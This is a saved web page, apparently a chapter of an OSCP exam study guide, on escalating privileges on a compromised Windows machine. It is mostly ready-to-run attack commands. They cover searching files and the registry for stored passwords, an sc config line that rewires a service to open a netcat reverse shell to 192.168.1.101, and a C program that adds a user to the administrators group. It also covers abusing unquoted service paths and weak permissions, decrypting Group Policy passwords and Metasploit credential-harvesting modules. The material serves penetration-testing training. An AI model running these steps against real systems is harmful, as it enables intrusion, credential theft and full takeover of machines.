                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <a class="btn pull-left js-toolbar-action" aria-label="" href="#"><i class="fa fa-align-justify"></i></a><div class="dropdown pull-right js-toolbar-action"><a class="btn toggle-dropdown" aria-label="Share" href="#"><i class="fa fa-share-alt"></i></a><div class="dropdown-menu dropdown-left"><div class="dropdown-caret"><span class="caret-outer"></span><span class="caret-inner"></span></div><div class="buttons"><button class="button size-5 ">Facebook</button><button class="button size-5 ">Google+</button><button class="button size-5 ">Twitter</button><button class="button size-5 ">Weibo</button><button class="button size-5 ">Instapaper</button></div></div></div><a class="btn pull-right js-toolbar-action" aria-label="" href="#"><i class="fa fa-facebook"></i></a><a class="btn pull-right js-toolbar-action" aria-label="" href="#"><i class="fa fa-twitter"></i></a><div class="dropdown pull-left font-settings js-toolbar-action"><a class="btn toggle-dropdown" aria-label="Font Settings" href="#"><i class="fa fa-font"></i></a><div class="dropdown-menu dropdown-right"><div class="dropdown-caret"><span class="caret-outer"></span><span class="caret-inner"></span></div><div class="buttons"><button class="button size-2 font-reduce">A</button><button class="button size-2 font-enlarge">A</button></div><div class="buttons"><button class="button size-2 ">Serif</button><button class="button size-2 ">Sans</button></div><div class="buttons"><button class="button size-3 ">White</button><button class="button size-3 ">Sepia</button><button class="button size-3 ">Night</button></div></div></div><h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/">Privilege Escalation - Windows</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="privilege-escalation-windows">Privilege Escalation Windows</h1>
<p>We now have a low-privileges shell that we want to escalate into a privileged shell.</p>
<h2 id="basic-enumeration-of-the-system">Basic Enumeration of the System</h2>
<p>Before we start looking for privilege escalation opportunities we 
need to understand a bit about the machine. We need to know what users 
have privileges. What patches/hotfixes the system has.</p>
<pre><code># Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain &lt;Group Name&gt;

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn
</code></pre><h2 id="cleartext-passwords">Cleartext Passwords</h2>
<h3 id="search-for-them">Search for them</h3>
<pre><code>findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
</code></pre><h3 id="in-files">In Files</h3>
<p>These are common files to find them in. They might be base64-encoded. So look out for that.</p>
<pre><code>c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
</code></pre><h3 id="in-registry">In Registry</h3>
<pre><code># VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
</code></pre><h2 id="service-only-available-from-inside">Service only available from inside</h2>
<p>Sometimes there are services that are only accessible from inside the
 network. For example a MySQL server might not be accessible from the 
outside, for security reasons. It is also common to have different 
administration applications that is only accessible from inside the 
network/machine. Like a printer interface, or something like that. These
 services might be more vulnerable since they are not meant to be seen 
from the outside.</p>
<pre><code>netstat -ano
</code></pre><p>Example output:</p>
<pre><code>Proto  Local address      Remote address     State        User  Inode  PID/Program name
    -----  -------------      --------------     -----        ----  -----  ----------------
    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
</code></pre><p>Look for <strong>LISTENING/LISTEN</strong>. Compare that to the scan you did from the outside.<br>Does it contain any ports that are not accessible from the outside?</p>
<p>If that is the case, maybe you can make a remote forward to access it.</p>
<pre><code># Port forward using plink
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

# Port forward using meterpreter
portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;
portfwd add -l 3306 -p 3306 -r 192.168.1.101
</code></pre><p>So how should we interpret the netstat output?</p>
<p><strong>Local address 0.0.0.0</strong><br>Local address 0.0.0.0 means
 that the service is listening on all interfaces. This means that it can
 receive a connection from the network card, from the loopback interface
 or any other interface. This means that anyone can connect to it.</p>
<p><strong>Local address 127.0.0.1</strong><br>Local address 127.0.0.1 
means that the service is only listening for connection from the your 
PC. Not from the internet or anywhere else. <strong>This is interesting to us!</strong></p>
<p><strong>Local address 192.168.1.9</strong><br>Local address 
192.168.1.9 means that the service is only listening for connections 
from the local network. So someone in the local network can connect to 
it, but not someone from the internet. <strong>This is also interesting to us!</strong></p>
<h2 id="kernel-exploits">Kernel exploits</h2>
<p>Kernel exploits should be our last resource, since it might but the 
machine in an unstable state or create some other problem with the 
machine.</p>
<p><strong>Identify the hotfixes/patches</strong></p>
<pre><code class="lang-bash">systeminfo
<span class="hljs-comment"># or</span>
wmic qfe get Caption,Description,HotFixID,InstalledOn
</code></pre>
<p><strong>Python to Binary</strong></p>
<p>If we have an exploit written in python but we don't have python 
installed on the victim-machine we can always transform it into a binary
 with pyinstaller. Good trick to know.</p>
<h2 id="scheduled-tasks">Scheduled Tasks</h2>
<p>Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite.</p>
<pre><code>schtasks /query /fo LIST /v
</code></pre><p>This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with <code>findstr</code>. So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal.</p>
<p>Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user.</p>
<pre><code>cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
</code></pre><h2 id="change-the-upnp-service-binary">Change the upnp service binary</h2>
<pre><code class="lang-cmd">sc config upnphost binpath= "C:\Inetpub\nc.exe <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">101</span> <span class="hljs-number">6666</span> -e c:\Windows\system32\<span class="hljs-built_in">cmd</span>.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
</code></pre>
<h2 id="weak-service-permissions">Weak Service Permissions</h2>
<p>Services on windows are programs that run in the background. Without a GUI.</p>
<p>If you find a service that has write permissions set to <code>everyone</code> you can change that binary into your custom binary and make it execute in the privileged context.</p>
<p>First we need to find services. That can be done using <code>wmci</code> or <code>sc.exe</code>.
 Wmci is not available on all windows machines, and it might not be 
available to your user. If you don't have access to it, you can use <code>sc.exe</code>.</p>
<p><strong>WMCI</strong></p>
<pre><code>wmic service list brief
</code></pre><p>This will produce a lot out output and we need to know 
which one of all of these services have weak permissions. In order to 
check that we can use the <code>icacls</code> program. Notice that <code>icacls</code> is only available from Vista and up. XP and lower has <code>cacls</code> instead.</p>
<p>As you can see in the command below you need to make sure that you have access to <code>wimc</code>, <code>icacls</code> and write privilege in <code>C:\windows\temp</code>.</p>
<pre><code class="lang-cmd"><span class="hljs-keyword">for</span> /f "tokens=<span class="hljs-number">2</span> delims='='" %a <span class="hljs-keyword">in</span> ('wmic service list full^|<span class="hljs-built_in">find</span> /i "pathname"^|<span class="hljs-built_in">find</span> /i /v "system32"') <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> %a &gt;&gt; c:\windows\temp\permissions.txt

<span class="hljs-keyword">for</span> /f eol^=^"^ delims^=^" %a <span class="hljs-keyword">in</span> (c:\windows\temp\permissions.txt) <span class="hljs-keyword">do</span> <span class="hljs-built_in">cmd</span>.exe /c icacls "%a"
</code></pre>
<p>Binaries in system32 are excluded since they are mostly correct, since they are installed by windows.</p>
<p><strong>sc.exe</strong></p>
<pre><code class="lang-cmd">sc query state= all | <span class="hljs-built_in">findstr</span> "SERVICE_NAME:" &gt;&gt; Servicenames.txt

<span class="hljs-keyword">FOR</span> /F %i <span class="hljs-keyword">in</span> (Servicenames.txt) <span class="hljs-keyword">DO</span> <span class="hljs-built_in">echo</span> %i
<span class="hljs-built_in">type</span> Servicenames.txt

<span class="hljs-keyword">FOR</span> /F "tokens=<span class="hljs-number">2</span> delims= " %i <span class="hljs-keyword">in</span> (Servicenames.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">echo</span> %i &gt;&gt; services.txt

<span class="hljs-keyword">FOR</span> /F %i <span class="hljs-keyword">in</span> (services.txt) <span class="hljs-keyword">DO</span> @sc qc %i | <span class="hljs-built_in">findstr</span> "BINARY_PATH_NAME" &gt;&gt; <span class="hljs-built_in">path</span>.txt
</code></pre>
<p>Now you can process them one by one with the cacls command.</p>
<pre><code>cacls "C:\path\to\file.exe"
</code></pre><p><strong>Look for Weakness</strong></p>
<p>What we are interested in is binaries that have been installed by the user. In the output you want to look for <code>BUILTIN\Users:(F)</code>. Or where your user/usergroup has <code>(F)</code> or <code>(C)</code> rights.</p>
<p>Example:</p>
<pre><code>C:\path\to\file.exe 
BUILTIN\Users:F
BUILTIN\Power Users:C 
BUILTIN\Administrators:F 
NT AUTHORITY\SYSTEM:F
</code></pre><p>That means your user has write access. So you can just rename the <code>.exe</code>
 file and then add your own malicious binary. And then restart the 
program and your binary will be executed instead. This can be a simple 
getsuid program or a reverse shell that you create with msfvenom.</p>
<p>Here is a POC code for getsuid.</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span>
</span>{
<span class="hljs-keyword">int</span> i;
    i = system(<span class="hljs-string">"net localgroup administrators theusername /add"</span>);
<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>We then compile it with mingw like this:</p>
<pre><code class="lang-bash">i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
</code></pre>
<p><strong>Restart the Service</strong></p>
<p>Okay, so now that we have a malicious binary in place we need to 
restart the service so that it gets executed. We can do this by using <code>wmic</code> or <code>net</code> the following way:</p>
<pre><code>wmic service NAMEOFSERVICE call startservice
</code></pre><pre><code>net stop [service name] &amp;&amp; net start [service name].
</code></pre><p>The binary should now be executed in the SYSTEM or Administrator context.</p>
<p><strong>Migrate the meterpreter shell</strong></p>
<p>If your meterpreter session dies right after you get it you need 
migrate it to a more stable service. A common service to migrate to is 
winlogon.exe since it is run by system and it is always run. You can 
find the PID like this:</p>
<pre><code>wmic process list brief | find "winlogon"
</code></pre><p>So when you get the shell you can either type <code>migrate PID</code> or automate this so that meterpreter automatically migrates.</p>
<p><a href="http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html" target="_blank">http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html</a></p>
<h2 id="unquoted-service-paths">Unquoted Service Paths</h2>
<p><strong>Find Services With Unquoted Paths</strong></p>
<pre><code># Using WMIC
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

# Using sc
sc query
sc qc service name

# Look for Binary_path_name and see if it is unquoted.
</code></pre><p>If the path contains a space and is not quoted, the service is vulnerable.</p>
<p><strong>Exploit It</strong></p>
<p>If the path to the binary is:</p>
<pre><code>c:\Program Files\something\winamp.exe
</code></pre><p>We can place a binary like this</p>
<pre><code>c:\program.exe
</code></pre><p>When the program is restarted it will execute the binary <code>program.exe</code>, which we of course control. We can do this in any directory that has a space in its name. Not only <code>program files</code>.</p>
<p>This attack is explained here:<br><a href="http://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank">http://toshellandback.com/2015/11/24/ms-priv-esc/</a></p>
<p>There is also a metasploit module for this is: exploit/windows/local/trusted_service_path</p>
<h2 id="vulnerable-drivers">Vulnerable Drivers</h2>
<p>Some driver might be vulnerable. I don't know how to check this in an efficient way.</p>
<pre><code># List all drivers
driverquery
</code></pre><h2 id="alwaysinstallelevated">AlwaysInstallElevated</h2>
<pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
</code></pre><p><a href="http://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank">http://toshellandback.com/2015/11/24/ms-priv-esc/</a></p>
<h2 id="group-policy-preference">Group Policy Preference</h2>
<p>If the machine belongs to a domain and your user has access to <code>System Volume Information</code> there might be some sensitive files there.</p>
<p>First we need to map/mount that drive. In order to do that we need to
 know the IP-address of the domain controller. We can just look in the 
environment-variables</p>
<pre><code># Output environment-variables
set

# Look for the following:
LOGONSERVER=\\NAMEOFSERVER
USERDNSDOMAIN=WHATEVER.LOCAL

# Look up ip-addres
nslookup nameofserver.whatever.local

# It will output something like this
Address:  192.168.1.101

# Now we mount it
net use z: \\192.168.1.101\SYSVOL

# And enter it
z:

# Now we search for the groups.xml file
dir Groups.xml /s
</code></pre><p>If we find the file with a password in it, we can decrypt it like this in Kali</p>
<pre><code>gpp-decrypt encryptedpassword
</code></pre><pre><code>Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes
</code></pre><h2 id="escalate-to-system-from-administrator">Escalate to SYSTEM from Administrator</h2>
<h3 id="on-windows-xp-and-older">On Windows XP and Older</h3>
<p>If you have a GUI with a user that is included in Administrators group you first need to open up <code>cmd.exe</code>
 for the administrator. If you open up the cmd that is in Accessories it
 will be opened up as a normal user. And if you rightclick and do <code>Run as Administrator</code> you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from <code>c:\windows\system32\cmd.exe</code>. This will give you a cmd with Administrators rights.</p>
<p>From here we want to become SYSTEM user. To do this we run:</p>
<p>First we check what time it is on the local machine:</p>
<pre><code>time

# Now we set the time we want the system CMD to start. Probably one minuter after the time.
at 01:23 /interactive cmd.exe
</code></pre><p>And then the cmd with SYSTEM privs pops up.</p>
<h3 id="vista-and-newer">Vista and Newer</h3>
<p>You first need to upload PsExec.exe and then you run:</p>
<pre><code>psexec -i -s cmd.exe
</code></pre><h3 id="kitrap">Kitrap</h3>
<p>On some machines the <code>at 20:20</code> trick does not work. It never works on Windows 2003 for example. Instead you can use Kitrap. Upload both files and execute <code>vdmaillowed.exe</code>. I think it only works with GUI.</p>
<pre><code>vdmallowed.exe
vdmexploit.dll
</code></pre><h3 id="using-metasploit">Using Metasploit</h3>
<p>So if you have a metasploit meterpreter session going you can run <code>getsystem</code>.</p>
<h2 id="post-modules">Post modules</h2>
<p>Some interesting metasploit post-modules</p>
<p>First you need to background the meterpreter shell and then you just run the post modules.<br>You can also try some different post modules.</p>
<pre><code>use exploit/windows/local/service_permissions

post/windows/gather/credentials/gpp

run post/windows/gather/credential_collector 

run post/multi/recon/local_exploit_suggester

run post/windows/gather/enum_shares

run post/windows/gather/enum_snmp

run post/windows/gather/enum_applications

run post/windows/gather/enum_logged_on_users

run post/windows/gather/checkvm
</code></pre><h2 id="references">References</h2>
<p><a href="http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/" target="_blank">http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/</a><br><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank">http://www.fuzzysecurity.com/tutorials/16.html</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/" target="_blank">https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/</a><br><a href="http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html" target="_blank">http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html</a><br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank">https://github.com/gentilkiwi/mimikatz</a><br><a href="http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html" target="_blank">http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html</a><br><a href="https://www.youtube.com/watch?v=kMG8IsCohHA&amp;feature=youtu.be" target="_blank">https://www.youtube.com/watch?v=kMG8IsCohHA&amp;feature=youtu.be</a><br><a href="https://www.youtube.com/watch?v=PC_iMqiuIRQ" target="_blank">https://www.youtube.com/watch?v=PC_iMqiuIRQ</a><br><a href="http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/" target="_blank">http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/</a><br><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp" target="_blank">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp</a><br><a href="http://pwnwiki.io/#!privesc/windows/index.md" target="_blank">http://pwnwiki.io/#!privesc/windows/index.md</a></p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class="search-results-count"></span> results matching "<span class="search-query"></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class="search-query"></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html" class="navigation navigation-prev " aria-label="Previous page: Privilege Escalation - Linux">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/escaping_restricted_shell.html" class="navigation navigation-next " aria-label="Next page: Escaping Restricted Shell" style="margin-right: 12px;">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Privilege Escalation - Windows","level":"1.6.4","depth":2,"next":{"title":"Escaping Restricted Shell","level":"1.6.5","depth":2,"path":"escaping_restricted_shell.md","ref":"escaping_restricted_shell.md","articles":[]},"previous":{"title":"Privilege Escalation - Linux","level":"1.6.3","depth":2,"path":"privilege_escalation_-_linux.md","ref":"privilege_escalation_-_linux.md","articles":[]},"dir":"ltr"},"config":{"plugins":["comment"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"comment":{"highlightCommented":true},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"github":"sushant747/security","theme":"default","author":"sushant747","pdf":{"pageNumbers":true,"fontSize":16,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Total OSCP Guide","language":"en","links":{"sidebar":{"Total OSCP Guide":"https://www.gitbook.com/book/sushant747/total-oscp-guide"},"gitbook":true},"gitbook":"*","description":"This book captures knowledge base required for Offensive Security's OSCP Exam"},"file":{"path":"privilege_escalation_windows.md","mtime":"2017-03-26T09:38:56.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-28T08:38:17.767Z"},"basePath":".","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/gitbook.js"></script>
    <script src="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/theme.js"></script>
    
        
        <script src="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/plugin.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/search-engine.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/search.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/lunr.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/search-lunr.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/buttons.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/fontsettings.js"></script>
        
    

    


</body></html>